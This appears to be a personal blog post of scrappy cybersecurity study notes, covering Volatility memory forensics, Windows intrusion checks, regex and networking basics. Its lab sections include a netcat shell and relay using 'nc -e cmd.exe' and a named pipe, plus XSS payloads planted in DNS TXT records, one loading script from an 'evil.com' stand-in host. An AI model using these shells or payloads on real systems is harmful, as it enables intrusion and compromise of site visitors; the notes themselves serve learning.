---
title: Namespace Notes
author: erika
date: 2024-08-14 20:55:00 +0800
categories: [tech]
tags: [scrapbook, notes, volumes]
pin: false

image:
  path: /assets/img/namespace-notes.PNG
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: duffle bag for pentest

---

## Small Book 1 

### Formal Titles: 
    Threat Detection
    Forensics
    Enterprise Security
    Security Engineering
    Web Aoo Pentesting/Bug Bounties
    Email Research
    Radio/WiFi
    SCADA
    Satellites/Deepspace
    
### REGEX 
    (\S)(M) --> Grabs all nonwhite character spaces that occur right before the character M
    
    :999999/s2test}" "Mozilla/5.0 (Windows NT 10.0", ....(K HTML, live Gecko)...
    
    --> "M
    
    
    (\S)(HTTP)(\s)
    
    Hypertext Transfer Protocol HTTP/1.1
    
    
### Splunk Regex (rex)

| rex field=System_Props_Xml

That vanilla regex command up there could probably correspond with 

(\S|\s)  (?<  extracted  >\SM)"

--> (\S|\s) at the front is **Match and Exclude**
--> " at the end is **Match and Exclude**
----> NOTE: that stuff inside the paranthesis is for **match and INCLUDE**






## The Post-It Parts

### Incident Response

"... malfind, injectrd code"

... the header of a Windows exe will always start with "4D 5A" -> MZ in ASCII _decoded text_  

    Offset(h) 00 01 02 03 04 05...
    
    0000 0000 4D 5A 90 00 03 00
    0000 0110 ...
    
Any of these values in a process will amount to malware injection

This indeed turned up for reader_s1.exe

    MZ...... yy... ..* ..... 
    This program cannot be read in DOS Mode



### XSS Stuff
Payload gets delivered via a network packet

#### Part 1

    <script>alert('XSS!')</script>
    
#### Part 2

    /etc/bind/zones/....db
    
#### Part 3

    Actually create a file to upload xss into a dns record 


### Mysterious Pink Post-It
    Microsoft: How to make an autorun-enabled application
    Velociraptor: Open Source Col
    github rsmudge/Malleable 
        C2 Profiles crimewave/zeus.profile
    a_rey/google\_RAT
    app.letsdefend.io
        reverse engineering
    crypt0ace.github.io/posts/DLL-Sideloading
    
### What is TCP/IP?
    TCP: Manages how a message gets broken down. Addresses transmitted
    IP: How is it Routed?
    Reliability
    
    Client --> Sends SYN
    Host --> Sends SYN ACK
    Client --> Sends ACK
    
    TLS: Security layer on top of TCP/IP to establish 
    
    Any layers on top like TLS establishes encryption algorithms
    
    
    
### Powershell Stuff
Invoke-Item [file]
open the file 

Get-Item -Path C:\folder\or\file\path
(Get-Item -Path C:\folder\or\file\path).LastWriteTime
dir * | select name,LastWriteTime,CreationTime,LastAccessTime

(from NeemoBeer)
https://windowsforum.com/threads/how-to-get-folder-properties-in-the-command-line-similar-to-wmic-datafile-for-files.263352/



--- 
## A


4D 5A

python vol.py -f infected.vmem [windows.psscan]
    (lists a list of PID's and PPID's)
    
    3968  2732  @WanaDecrypt
    2732  1456  or4qtckT.exe

python vol.py -f infected.vmem [windows.pstree]
    * or4qtckT.exe   0x83ed43
    * @WanaDecryptor 0x83ed680


python vol.py -f infected.vmem windows.handles --pid 2732
    2732 or4qtckT.exe FILE
    
    "...handles are unsigned integers used to keep track of objects in memory. It is a pointer to some type of memory location".
    
    
    
**svchost should always have a -k flag after. 
** this -k flag specifies the group name which svchost needs to start

ProcessScan

python.exe

## Condensed Spellbook - 3.1 Netcat Linux Relay

Start with 2 machines

Machine #1: Windows (10.10.0.1)
Machine #2: Linux (10.10.75.1)

1. Start up a listening shell on Machine #1 

** nc -l -p 54321 -e cmd.exe

The -e means it will execute a shell once it received a connection on that port

2. On Machine #2 create a named pipe and start a relay to interact with it

** mknod backpipe p
** nc -l -p 11111 0<backpipe | nc 10.10.0.1 54321 1>backpipe


This step was kind of tricky to me, no one really explained to me exactly what a backpipe is

"In the context of the command nc -l -p 11111 0<backpipe | nc 10.10.0.1 54321 1>backpipe, a named pipe (backpipe) is being utilized to establish a relay between two instances of the nc (Netcat) command.



nc -l -p 11111 0<backpipe: This command initiates a listening mode (-l) on port 11111 using Netcat (nc). The 0<backpipe part reads input from the named pipe (backpipe). This means that any data written into backpipe will be sent out through the listening Netcat process on port 11111.

 The 1>backpipe part writes output to the named pipe (backpipe)
 
 
  This means that any data received from the remote server at 10.10.0.1:54321 will be written into backpipe, 
  
  
  
nc 10.10.0.1 54321 1>backpipe: This command establishes a connection to the specified IP address (10.10.0.1) and port (54321) using Netcat. The 1>backpipe part writes output to the named pipe (backpipe). This means that any data received from the remote server at 10.10.0.1:54321 will be written into backpipe, which will then be read by the listening Netcat process established in the first part of the command.


"

According to the AI Overlords, 


"...The command mknod is used to create **special files** in Unix-like operating systems. In this context, mknod is being used to create a named pipe, which is a special type of file that allows **interprocess communication (IPC) between processes.**"

"...Here's what each part of the command mknod backpipe p means:

mknod: This is the command itself used to create special files.
backpipe: This is the name given to the named pipe. You can choose any name you want for the named pipe.
p: This specifies that we are creating a named pipe. In Unix-like systems, p is the type for a named pipe.
"


"
In Unix-like operating systems, there are primarily two types of pipes: unnamed pipes (also known as anonymous pipes) and named pipes (also known as FIFOs - First In, First Out).

Unnamed Pipes (Anonymous Pipes):

Unnamed pipes are created using the pipe system call.
They exist within the kernel's memory and are used for communication between parent and child processes or between related processes created by a common ancestor.
Unnamed pipes are typically used for simple, one-way communication between processes.
They have no persistent representation on the file system and are automatically closed when the processes using them terminate.
Named Pipes (FIFOs):

Named pipes are created using the mkfifo command or the mknod command with the type p.
They are represented as special files in the file system and have a persistent existence, allowing unrelated processes to communicate with each other.
Named pipes are similar to unnamed pipes but can be accessed by any process with appropriate permissions.
They provide bidirectional communication and can be used for more complex inter-process communication scenarios.
These pipes serve as a mechanism for IPC (Inter-Process Communication) in Unix-like systems, allowing processes to exchange data with each other efficiently.




""

3. On Machine #2, open a new terminal

** nc 127.0.0.1 11111 


     +------------------+                    +------------------+
     |     Machine #1   |                    |     Machine #2   |
     |    (Windows)     |                    |     (Linux)      |
     +------------------+                    +------------------+
             |                                     |
             |                                     |
             |                                     |
          +--+------------------+          +------+------------------+
          |  Start listening   |          |  Create named pipe  |
          |  shell on port    |          |  and start relay    |
          |  54321, execute   |          |  on port 11111     |
          |  cmd.exe          |          |                    |
          +-------------------+          +--------------------+
                    |                              |
                    |                              |
                    |                              |
          +---------+---------+            +-------+--------------+
          |  Data transmitted  |            |  Data received and  |
          |  over TCP to port  |            |  forwarded to TCP   |
          |  54321             |            |  port 54321         |
          +--------------------+            +---------------------+



## Condensed Spellbook - 4.2 XSS Scripting 
Spell showcases reflected XSS attack on a DNS Record. First off, the user goes to a dns-lookup tool

[example.com]/dnslookup --> showing TXT Records. 

When you register a DNS Record, you can include lots of fields such as DKIM but also TXT Records. The lab claims that this can contain javascript and thus execute

/etc/bind/zones


 
### 1. Vanilla XSS

Opens up a vulnerable web app and enters just a regular old XSS Injection in.... an input box 

\<script> alert('XSS 1!') </script>"

### 2. Edit the DNS Record and See

vim /etc/bind/zones/[redacted]info.db

(Bind DNS)

## example.com.  IN TXT "\<script> alert('XSS 2!') </script>"


Now if the user is doing this DNS lookup, the site will actually execute the javascript

### 3. Load+Execute an external JS File

We are repeating step 2 but rather than just having a typical <script>alert that explodes in the user's face when they pull up the DNS Record, this XSS will load from attacker.com/malicious.js

(Bind DNS)

example.com.  IN TXT "<script src='//evil.com/malicious.js'> </script>"

Keep in mind the A and MX records as well.

Credit goes where credit goes


Jamie Hankins, Erick Setiawan, Jonathan Davis, Devin Walters




## Incident Response

### Varonis Set
#### 1/3

"Can we capture the memory? (aka RAM)"

Malware can hide but it must run

- pstree: what process launched another? This will sniff out the fake svchost.exe. Windows prcesses always run from set locations. Our task is to look for Weird Locations and Weird Parent Processes

ex. taskhostw --> %systemroot%\system32\taskhost.exe
The parent process for taskhostwis always **svchost.exe**

maybe windows.malfind

#### 2/3
Identifying Injected Code

"Break past obfuscation"

the malware must unpack itself!
- In order to unpack itself, the malware has to create a child process 
- Inject the unpacked exe into a new process

**windows.malfind** -- hex permissions, headers

PID * ProcessName * Protection * 

"Page_EXECUTE_READWRITE"

Process has execute, read and write permissions 
executable headers 


How to find....

#### 3/3

"... the header of a Windows exe will ALWAYS start with **4D 5A** aka **MZ** in ASCII"

##### Hex code
Offset (h) 00 00 0z 03 04 05...
000000000       4D 5A 90 00 03 00 
000000

##### Decoded Text

Any of these values in a proces == malware injection

This indeed turned up for reader_s1.exe


MZ....... yy.. ....*.....This process cannot be run in DOS Mode




## Volatility Walkthrough

python vol.py cridex.vmem windows.cmdline

PID     Process     Args
664    lsass.exe    C:\\Windows\system32\lsass.exe  
824    svchost.exe  svchost -k DcomLaunch
998    svchost.exe  svchost -k rpcss
1056   svchost.exe  svchost -k Network Service

svc should always have -k, which "specifies the group policy"

8560  svchost.exe  C:\Windows\svchost.exe

"no -k for any legit svchost.exe"

vol.py -f "cridex.vmem" -o . windows.memmap --dump --pid 1640


## Python Stuff

python -m SimpleHTTP Server

## Scripting Stuff

### Powershell

 findstr "apple" "C:\\notes.txt"
 ls | Sort-Object LastAccessTime
 
 
 
 
 
## stuff

netstat -naob 5

--> gets the executable name and the DLL's loaded for the network connection

Unusual accounts in the admin group

lsusr.msc

event log service was stopped
MSTelnet Service has started
Windows File Protection is not active


 

## Musing 

- Do you feel that your role lets you be flexible in your analysis?

- Do you have plans ot overhaul the analysis process?

- How long do these incident cases typically remain open?

- What type of threat actor is your primary concern?

- Who are your main adversaries?

- What is the typical career progression for people in this team?

- Whats the percentage of time spent on projects vs actioning items?

- Can you describe the typical threats or challenges this team deals with? And what strategies are in place to detect and respond?



## Some Projects

Microsoft: how to make an autorun-enabled application
Velociraptor open source Col

github.rsmudge/Malleable C2 profiles crimeware /zeus.profile

a_rey/google_RAT

app.letsdefend.io reverse engineering

cryt0ace.github.io/posts/DLL-Sideloading


## SANS Windows Intrusion Discovery

Unusual Files and Registry Keys

dir c:\ 

HKLM & HKCU 
Software\Microsoft\Windows\CurrentVersion\Run
Software\Microsoft\Windows\CurrentVersion\RunOnce
Software\Microsoft\Windows\CurrentVersion\RunOnceEx

#### Registry Editor
regedit --> reg query <reg key>
-->registry editor


#### File Share
net view \\127.0.0.1 

#### Open SMB Sessions
net session 

#### Unusual 
- Process/Services
- Files/Registry Keys
- Weird Network use
- Scheduled Tasks
- Unusual Accounts
- Log Entries


#### Processes/Services
##### Task Manager
> tasklist
wmic process list full

services.msc

net start 

(list running network services)

##### net use 
smb sessions this machine has opened on other systems


## What is TCP/IP?
### TCP
Manages how a message gets broken down. Address Transmitted!
### IP
How is it routed?


The focus is on reliability

Client: SYN
Host:  Sends SYN-ACK
Client: Sends ACK

TLS: Security layer on top of the TCP/IP 
Any layers on top like TLS establishes encryption algorithms



## Viruses vs Worms vs Malware

- Malware encompasses all of these and spyware, ransomware, and worms.
- Worms self replicate and viruses must be sent from one computer to another via user or software.

## What is a Hypervisor?

A program for running one or more virtual machines on a computer.

Creates and runs VM's (virtual machines) 

"...containers are lightweight because they do not require an extra load of a hypervisor. They run directly within the host machine's kernel."


